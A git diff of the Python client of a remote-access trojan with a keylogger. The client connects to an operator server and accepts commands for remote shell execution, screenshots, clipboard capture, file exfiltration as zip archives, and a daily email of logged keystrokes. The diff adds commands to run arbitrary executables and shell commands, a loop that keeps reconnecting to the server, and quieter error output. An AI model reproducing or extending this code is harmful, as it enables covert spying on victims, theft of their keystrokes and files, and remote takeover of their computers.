@@ -62,9 +62,22 @@ class Client:
             "-ss": self.screenshot,
             "-shell": self.fakeshell,
             "-loop": self.endless,
-            "-email": self.email
+            "-email": self.email,
+            "-dailymail": self.startEmailthread,
+            "-endmailer": self.stopEmailThread,
+            "-drop": self.drop,
+            "-disc": self.disc
         }
         self.Keylogger = type(Keylogger)
+
+    def disc(self):
+        sys.exit()
+
+    def drop(self):
+        global run
+        run = False
+        sys.exit()
+
     def connectToServer(self):
         self.client.connect((self.SERVER_IP, self.PORT))
 
@@ -78,6 +91,7 @@ class Client:
             print("Pairing Failed")
             self.client.send("MISMATCH".encode("utf-8"))
             self.client.close()
+            sys.exit()
 
         else:
             print("KEYS MATCHED - PAIRING SUCCESSFUL")
@@ -277,7 +291,8 @@ class Client:
             obj, _ = subprocess.run(msg, check=True, shell=True)
             # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
         except Exception as e:
-            print("This failed too (runrun) : " + str(e) + " + " + str(obj))
+            print(".")
+            # print("This failed too (runrun) : " + str(e) + " + " + str(obj))
 
     def MSGBOX(self):
         insert = self.client.recv(self.BUFFER_SIZE).decode()
@@ -293,7 +308,7 @@ class Client:
         os.remove("File.vbs")
 
     def txtmsg(self):
-        print("TextMessageMode: Activated")
+        print("[!] TextMessageMode: Activated")
         message = self.client.recv(self.BUFFER_SIZE).decode()
         print("Server:", message)
         # self.send(output.encode())
@@ -301,10 +316,10 @@ class Client:
         self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
     def filesend(self):
-        print("FILE SEND MODE: Enabled")
+        print("[!] FILE SEND MODE: Enabled")
         filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
         filelist = os.listdir(filePath)
-        self.client.send("Success".encode("utf-8"))
+        self.client.send("[*] Success".encode("utf-8"))
         # create a zip archive
         archname = './logs/files.zip'
         archive = ZipFile(archname, 'w')
@@ -338,7 +353,7 @@ class Client:
     def fakeshell(self):
         """ Shell """
 
-        print("SHELL MODE ENABLED: ")
+        print("[!] SHELL MODE ENABLED: ")
         msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
         if "cd" in msg.lower():
             try:
@@ -357,26 +372,26 @@ class Client:
         status = emailsendfilepath(filename)
         self.client.send(status.encode())
 
-
     def endless(self):
+        global run
         malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
         if malorgood == "1":
-            print("Malicious mode enabled: ")
+            print("[-] Malicious mode enabled: ")
             self.client.send("1".encode("utf-8"))
         else:
-            print("Virtuous mode enabled: ")
+            print("[-] Virtuous mode enabled: ")
             self.client.send("2".encode("utf-8"))
             self.confirmconnection()
-        self.startEmailthread()
-        while True:
+        #self.startEmailthread()
+        while run:
             print("entered loop")
             msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
-            print("message received {msg} = "+str(msg))
+            print("[@] message received {msg} = "+str(msg))
             try:
                 func = self.FinalSwitcher.get(msg)
                 func()
             except TypeError:
-                print("This operation does not exist. ")
+                print("[!*!] This operation does not exist. ")
             except Exception as e:
                 print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))
 
@@ -385,12 +400,24 @@ class Client:
 
     def exePy(self):
         path2script = self.client.recv(self.BUFFER_SIZE).decode()
-
         try:
-            exec(open(path2script).read())
-            self.client.send("SUCCESS".encode())
-        except:
-            self.client.send("FAILURE".encode())
+            if ".py" in path2script:
+                exec(open(path2script).read())
+            elif ".exe" in path2script:
+                try:
+                    os.startfile(path2script)
+                except:
+                    pass
+            else:
+                try:
+                    msg = "cmd /c " + path2script
+                    self.runrun(msg)
+                except: 
+                    pass
+            self.client.send("[*] SUCCESS".encode())
+
+        except Exception as e:
+            self.client.send(("[!!] FAILURE + " + str(e)).encode())
 
     def hidefile(self, filepath):
         command = "attrib +h "+filepath+""
@@ -410,11 +437,19 @@ class Client:
                 self.client.send(tosend)  # sending actual file
             # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
             self.sscount += 1
-        print("SUCCESS")
+        print("[*] SUCCESS")
 
     def startEmailthread(self):
+        global eThreadActive
+        eThreadActive = True
         eThread = threading.Thread(target=Scheduler)
         eThread.start()
+        self.client.send("[*] Success".encode())
+
+    def stopEmailThread(self):
+        global eThreadActive
+        eThreadActive = False
+        self.client.send("*** Email Thread Killed ***".encode())
 # ''' STATIC METHODS '''
 def getClipBoard():
     cb = pyperclip.paste()  # getting the clipboard
@@ -457,19 +492,18 @@ def emailsendfilepath(filepath):
                 emailsendbody(body)
                 return "OK"
         else:
-            return "FILE DOESNT EXIST"
+            return "[!!] FILE DOESNT EXIST"
 
-
+Ethread = False
+run = True
 def Scheduler():
     # SCHEDULER
     schedule.every().day.at("22:47").do(emailsendfilepath, "./logs/readable.txt")
-    while True:
+    global eThreadActive
+    while eThreadActive:
         schedule.run_pending()
         time.sleep(1)
-        print("Emailthread")
-
-
-
+        print(" - Emailthread - ")
 
 class Keylogger:
     def __init__(self):
@@ -542,7 +576,10 @@ def main():
     PORT = 1337  # modify me (if you want)
     BUFFER_SIZE = 2048
     safemode = bool(True)
-
+    global eThreadActive
+    global run
+    run = True
+    eThreadActive = False
     try:
         os.mkdir('./logs')
     except FileExistsError:
@@ -551,11 +588,14 @@ def main():
     CLIENT = socket.gethostname()
     CLIENT_IP = socket.gethostbyname(CLIENT)
     print(CLIENT_IP)
-    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)
 
-    client.connectToServer()
-    client.endless()
-
+    while run:
+        try:
+            client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)
+            client.connectToServer()
+            client.endless()
+        except:
+            pass
 
 if __name__ == "__main__":
     main()
